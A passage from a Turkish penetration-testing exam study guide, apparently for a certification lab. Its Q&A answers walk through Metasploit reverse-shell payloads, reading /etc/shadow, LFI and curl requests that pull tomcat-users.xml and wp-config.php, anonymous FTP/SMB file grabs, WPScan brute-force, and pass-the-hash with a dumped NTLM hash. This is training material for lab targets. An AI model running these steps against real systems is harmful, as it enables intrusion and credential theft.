...
> ---
> 
> **💡 Pratik Sınav Kuralı (LHOST / Payload Seçim Akışı):**
> 1. Modülü seçin: `use exploit/...`
> 2. **Payload Listesini İnceleyin:** `show payloads` komutunu çalıştırarak o exploit ile kullanabileceğiniz tüm payload'ları listeyin.
>    *   **Doğru Payload Seçimi:** Hedef işletim sistemine (Windows/Linux) ve mimarisine (64-bit için `x64`, 32-bit için generic) uygun olan; dosya transferi/pivoting gerekiyorsa **`meterpreter`**, gerekmiyorsa veya modül desteklemiyorsa düz **`shell`** içeren reverse (ters) bağlantı payload'unu belirleyin (Örn: `set PAYLOAD windows/x64/meterpreter/reverse_tcp`).
> 3. **Parametreleri Listeyin:** `show options` komutunu çalıştırın.
> 4. **Eğer tabloda `LHOST` değişkeni yer alıyorsa:** Bu, kurban makinenin size geri bağlanacağı bir **Ters Bağlantı (Reverse Shell)** senaryosudur. `set LHOST tun0` komutuyla kendi IP'nizi tanımlayın, ardından `exploit` edin.
> 5. **Eğer tabloda `LHOST` parametresi yer almıyorsa (yoksa):** Bu, kurbanın port açıp sizin ona bağlanacağınız bir **Düz Bağlantı (Bind Shell/Backdoor)** senaryosudur veya bir yardımcı tarayıcı (auxiliary) modülüdür. Sadece hedef IP'yi (`set RHOSTS <hedef_IP>`) tanımlayın ve doğrudan `exploit` / `run` edin.
> 
> ---
> 
> **🏆 Altın Tavsiye (Sınavda Nasıl Davranmalısınız?):**
> *   Modülü seçtiğinizde her zaman **`show payloads`** komutunu çalıştırın.
> *   Eğer listede **`meterpreter`** görüyorsanız (örn: EternalBlue veya PsExec'te olduğu gibi) kesinlikle **Meterpreter** içeren bir payload seçin.
> *   Eğer listede hiç meterpreter yoksa, sadece **`cmd/...`** veya **`shell`** görüyorsanız, en temiz ve stabil olanı (Linux için `cmd/unix/reverse`, Windows için `windows/shell/reverse_tcp`) seçerek düz shell alın.

</details>

---

### ❓ Soru 17: Elde ettiğiniz düz shell (command shell) oturumunu Meterpreter'a nasıl yükseltirsiniz?

<details>
<summary>🔑 <b>Çözüm Adımları ve Beklenen Çıktı</b></summary>

```bash
# Yöntem 1: Kısa yol (Düz shell oturumunuzun ID'sinin 1 olduğunu varsayarsak)
msf6 > sessions -u 1
...
**Sonuç:** Yeni bir Meterpreter oturumu açılır (Örn: Session 2).

> [!TIP]
> **Topluluk Notu:** Birçok aday `sessions -u` komutunu bilmediği için sınavda düz shell'de takılıp kalmıştır. Bu komut hayat kurtarır!

</details>

---

### ❓ Soru 18: Hedef Linux makinedeki tüm kullanıcıların parola hash'lerini elde ediniz. `root` kullanıcısının hash'i nedir?

<details>
<summary>🔑 <b>Çözüm Adımları ve Beklenen Çıktı</b></summary>

**Yöntem 1: Metasploit Post Modülü ile (Yükselttiğimiz Session 2'yi kullanarak)**
```bash
# 1. Meterpreter oturumunu arka plana alın
meterpreter > background
# 2. Modülü arama: search hashdump type:post platform:linux
...
> [!TIP]
> **Metasploit Modül Türlerinin Farkı (Exploit, Auxiliary, Post):**
> *   **`exploit` (Sızma):** Hedefteki bir açığı sömürerek sisteme sızmayı ve ilk bağlantıyı (**session**) elde etmeyi sağlar. Başlangıçta session istemez.
> *   **`auxiliary` (Yardımcı):** Tarama, brute-force veya zafiyet doğrulama gibi yardımcı işler için kullanılır. Sızma gerçekleştirmez ve çalışmak için aktif bir **session istemez**.
> *   **`post` (Sızma Sonrası):** Sızılmış bir makinede bilgi toplama (örn: bu sorudaki `hashdump`), yetki yükseltme veya pivotlama yapmak için kullanılır. Çalışması için kesinlikle **aktif bir session (SESSION ID)** girmek zorundasınız.

**Yöntem 2: Manuel (Meterpreter Shell Üzerinden)**
```bash
# 1. Meterpreter oturumuna geçin ve hedefin komut satırına düşün
meterpreter > shell
# 2. Yetkili kullanıcı olduğunuz için /etc/shadow dosyasını okuyun
$ cat /etc/shadow
```
...
> [!TIP]
> **Neden `hashdump` Modülüne Gerek Yok? (Pratik Sınav Bilgisi):**
> Sızdığımız makinede zaten en yetkili kullanıcı olan **root** yetkisine sahibiz. Linux'ta parola hash'leri `/etc/shadow` dosyasında saklanır ve burayı sadece root okuyabilir. Dolayısıyla Metasploit'in `hashdump` modülünü kurup çalıştırmakla vakit kaybetmek yerine, doğrudan terminale `cat /etc/shadow` yazarak tüm hash'leri anında okumak sınavda çok daha pratik bir çözümdür.

</details>

---

### ❓ Soru 19: `/root/flag.txt` dosyasının içeriği nedir?

<details>
<summary>🔑 <b>Çözüm Adımları ve Beklenen Çıktı</b></summary>

```bash
# Yöntem 1: Meterpreter oturumu (Session 2) üzerinden doğrudan okuma
meterpreter > cat /root/flag.txt

# Yöntem 2: Düz shell veya Meterpreter içindeki 'shell' üzerinden okuma
cat /root/flag.txt
```
...
### ❓ Soru 20: Tomcat Manager panelinin varsayılan giriş bilgilerini elde ediniz ve WAR dosyası yükleyerek shell alınız.

<details>
<summary>🔑 <b>Çözüm Adımları ve Beklenen Çıktı</b></summary>

#### 🚪 YÖNTEM 1: Kaba Kuvvet (Brute-Force) ile Giriş Bilgilerini Bulma

**Aşama 1: Şifreyi Kırın**
```bash
...
# Başarılı çıktıda kullanıcı adı ve şifre verilir:
# [+] 10.10.10.6:8080 - Success: 'tomcat:tomcat'
```

**Aşama 2: WAR Upload Modülü ile Sızın**
```bash
...
#### 📂 YÖNTEM 2: LFI veya Açık Paylaşımlar (FTP/SMB) Üzerinden Şifre Bulma (B Planı)

Eğer kaba kuvvet saldırısı engellenmişse veya şifre sözlükte yoksa, Tomcat'in kullanıcı bilgilerini ve rollerini düz metin olarak sakladığı **`tomcat-users.xml`** dosyasını okumaya çalışırız.

**Aşama 1: Dosyayı Ele Geçirme Yolları**

*   **1. Yol: LFI (Local File Inclusion) ile Dosya Okuma**
    *   **Tarayıcı Üzerinden:** Tarayıcınızın adres çubuğuna aşağıdaki olası Tomcat yollarını girerek dosyayı okumaya çalışın:
        - *Linux:* `http://10.10.10.6/index.php?file=/usr/share/tomcat/conf/tomcat-users.xml` (veya `/etc/tomcat/tomcat-users.xml`)
        - *Windows:* `http://10.10.10.6/index.php?file=C:\Program Files\Apache Software Foundation\Tomcat 8.5\conf\tomcat-users.xml`
    *   **Terminal Üzerinden (curl ile):**
        ```bash
        curl "http://10.10.10.6/index.php?file=/usr/share/tomcat/conf/tomcat-users.xml"
        ```

*   **2. Yol: Anonim FTP Bağlantısı ile Dosyayı İndirme**
    Hedefte şifresiz FTP girişi açık ise terminalden bağlanıp dosyayı indirin:
    ```bash
    # 1. FTP servisine bağlanın
    ftp 10.10.10.6
    # 2. Kullanıcı adı olarak "anonymous" girin, şifreyi boş bırakıp Enter'a basın
    Name (10.10.10.6:kali): anonymous
    Password: [Boş geçin]
    
    # 3. conf dizinine geçip tomcat-users.xml dosyasını indirin
    ftp> cd /conf
    ftp> get tomcat-users.xml
    ftp> exit
    ```

*   **3. Yol: SMB Şifresiz Paylaşımı ile Dosyayı İndirme**
    Açık SMB klasörleri üzerinden dosyayı indirmeyi deneyin:
    ```bash
    # 1. Şifresiz paylaşımları listeleyin (Şifre sorulduğunda Enter'a basın)
    smbclient -L //10.10.10.6 -N
    
    # 2. Açık olan paylaşıma bağlanın (Örn: backups)
    smbclient //10.10.10.6/backups -N
    
    # 3. Paylaşım içindeki dosyayı indirin
    smb: \> get tomcat-users.xml
    smb: \> exit
    ```

**Aşama 2: Şifreyi Dosyadan Okuma**
İndirdiğiniz veya ekranda görüntülediğiniz `tomcat-users.xml` dosyasının içinde `manager-gui` rolüne sahip satırı arayın:
```xml
<user username="tomcat" password="tomcat_password_here" roles="manager-gui"/>
```
Buradaki kullanıcı adı (`tomcat`) ve şifre (`tomcat_password_here`) bilgilerini aldıktan sonra **Yöntem 1 / Aşama 2**'deki exploit modülünde `HttpUser` ve `HttpPass` olarak tanımlayıp sızma işlemini gerçekleştirin.
...
#### 🚪 YÖNTEM 1: WPScan (Kaba Kuvvet) ile Şifre Bulma

**Aşama 1: WPScan Kullanarak Şifreyi Kırın (Kali Terminali)**
```bash
# 1. Kullanıcıları tespit edin:
wpscan --url http://10.10.10.6 --enumerate u

# 2. Tespit edilen "admin" kullanıcısına kelime listesiyle brute-force yapın:
wpscan --url http://10.10.10.6 -U admin -P /usr/share/wordlists/fasttrack.txt
```

**Aşama 2: Metasploit ile Sızın**
```bash
...
Eğer brute-force engellenmişse veya şifre kırılamıyorsa, WordPress'in veritabanı şifrelerini düz metin olarak sakladığı **`wp-config.php`** dosyasını okumaya çalışırız. Sınavda bu şifre genellikle admin panelinde veya SSH'ta da kullanılır (**Password Reuse**).

**Aşama 1: wp-config.php Dosyasını Ele Geçirme**
*   **1. Yol: LFI (Local File Inclusion) ile Dosya Okuma:**
    LFI açığını kullanarak `wp-config.php` dosyasını çekmeyi deneyin:
    - *Linux:* `http://10.10.10.6/index.php?file=/var/www/html/wp-config.php` (veya `/var/www/wordpress/wp-config.php`)
    - *Windows:* `http://10.10.10.6/index.php?file=C:\xampp\htdocs\wp-config.php` (veya `C:\inetpub\wwwroot\wp-config.php`)
    - *Terminalden (curl ile):*
      ```bash
      curl "http://10.10.10.6/index.php?file=/var/www/html/wp-config.php"
      ```
*   **2. Yol: Anonim FTP Bağlantısı ile Dosyayı İndirme:**
    ```bash
    # 1. FTP'ye bağlanın
    ftp 10.10.10.6
    # 2. Kullanıcı adı: anonymous, şifreyi boş geçip Enter'a basın
    Name (10.10.10.6:kali): anonymous
    Password: [Boş geçin]
    
    # 3. Web dizinine (örn: /var/www/html) gidip dosyayı indirin
    ftp> cd /var/www/html
...
*   **3. Yol: SMB Şifresiz Paylaşımı ile Dosyayı İndirme:**
    ```bash
    # 1. Şifresiz paylaşımları listeleyin (Şifre istendiğinde Enter'a basın)
    smbclient -L //10.10.10.6 -N
    
    # 2. Açık paylaşıma bağlanın (Örn: backups veya html)
    smbclient //10.10.10.6/html -N
...
**Aşama 2: Şifreyi Dosyadan Okuma**
İndirdiğiniz veya görüntülediğiniz `wp-config.php` dosyasını açıp veritabanı şifre tanımlama satırını bulun:
```php
define( 'DB_USER', 'database_username' );
define( 'DB_PASSWORD', 'database_password_here' );
```
Elde ettiğiniz `database_password_here` şifresini **Password Reuse (Parola Yeniden Kullanımı)** kuralı uyarınca admin kullanıcısı için deneyin. Ardından **Yöntem 1 / Aşama 2**'deki Metasploit modülünde `PASSWORD` olarak tanımlayıp sızma işlemini tamamlayın.
...
#### 1. Aşama: İlk Windows Makineden Hash Elde Etme (hashdump)
İlk sızdığımız Windows makinedeki (örn: `10.10.10.5`) aktif Meterpreter oturumumuzda yerel kullanıcıların parolalarını toplamak için:

```bash
# SYSTEM yetkisinde olduğunuzdan emin olun (değilseniz getsystem çalıştırın)
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM

# Hash toplama komutunu çalıştırın
meterpreter > hashdump
```

**Beklenen hashdump çıktısı:**
```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
student:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```
> [!NOTE]
> Buradan `Administrator` kullanıcısına ait NTLM hash değerini kopyalıyoruz:
> `aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b` (LM:NTLM formatında).

#### 2. Aşama: Elde Edilen Hash ile İkinci Makineye Sızma (Pass-the-Hash)
Meterpreter oturumunu arka plana alıp, kopyaladığımız hash değerini doğrudan şifre yerine kullanarak ikinci makineye (`10.10.10.8`) sızıyoruz:

```bash
# İlk oturumu arka plana alalım
meterpreter > background

# Modülü arama: search psexec
msf6 > use exploit/windows/smb/psexec

# İkinci hedef makineyi ayarlayalım
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.10.8

# Yetkili kullanıcı adını yazalım
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator

# Şifre yerine kopyaladığımız LM:NTLM hash dizilimini yapıştıralım
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b

# Payload ve kendi IP/Port ayarlarımızı yapalım
msf6 exploit(windows/smb/psexec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set LHOST tun0
msf6 exploit(windows/smb/psexec) > set LPORT 4445

# Exploit ederek ikinci makinede oturum açalım
msf6 exploit(windows/smb/psexec) > exploit
```

**Neden çalışıyor:** Windows, ağ üzerinden (SMB/Nego) kimlik doğrulaması yaparken parolanın düz metin halini değil, hash halini (NTLM) kullanır. Metasploit PsExec modülü de `SMBPass` parametresine düz şifre yerine hash verildiğinde bunu algılar ve doğrudan hash'i Windows sunucusuna ileterek oturum açar (Pass-the-Hash).
...
# 2. Shell'i Meterpreter'a yükselt (-u: upgrade)
msf6 > sessions -u 2
# [*] Meterpreter session 3 opened

# 3. Yeni açılan Meterpreter oturumuna bağlan (-i: interact)
msf6 > sessions -i 3
meterpreter > cat /root/flag.txt
```

> 💡 **Not:** `sessions -u 2` mevcut düz shell'i (session 2) Meterpreter'a yükselterek arka planda yeni bir session (3) oluşturur. Ancak bu komut bizi otomatik olarak yeni oturumun içine sokmaz; biz hâlâ ana Metasploit konsolunda (`msf6 >`) kalırız. Kurban makinede `cat` gibi komutları çalıştırabilmek için `sessions -i 3` yazarak bu yeni oluşan oturumun içine girmemiz gerekir.
